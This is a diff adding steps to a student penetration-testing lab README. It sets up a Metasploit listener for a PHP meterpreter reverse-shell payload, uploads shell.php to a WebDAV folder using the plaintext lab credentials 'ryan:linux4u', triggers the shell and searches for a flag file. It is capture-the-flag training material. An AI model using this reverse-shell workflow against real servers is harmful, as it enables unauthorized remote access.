@@ -74,4 +74,30 @@ Project demostrating my knowledge in defensive security, and pentration testing 
 ![msf-payload](Images/msf-payload.png)
 
 - On the Kali machine we need to set up a listener.
-  
+  - Start msfconsole: run `msfconsole`
+  - Load module: run `use exploit/multi/handler`
+  - Set payload: run `set payload php/meterpreter/reverse_tcp`
+  - Set Local Host: run `set LHOST 192.168.1.90`
+  - Set Local Port: run `set LPORT 4444`
+  - View settings for module: run `show options`
+  - Start the listener: run `exploit`
+
+![listener](Images/reverse_shell_complete.png)
+
+- Now drag and drop the **shell.php** from the Kali desktop to the webserver.
+![msf-payload](Images/msfvenom_payload.png)
+
+- Connect to the webdav folder by navigating to **192.168.1.105/webdav** and use ryan's credentials. **ryan:linux4u**
+
+- Click the `shell.php` - If the browser is hanging or loading that means its working.
+
+## Using Meterpreter to find flag
+
+- Open the listener and change to the root directory. `cd /`
+- Search the system for files that conatin *flag* `find . -iname flag
+- Cat out the file found `cat flag.txt`
+![flag found](Images/flag_found.png)
+
+## Analysis
+
+
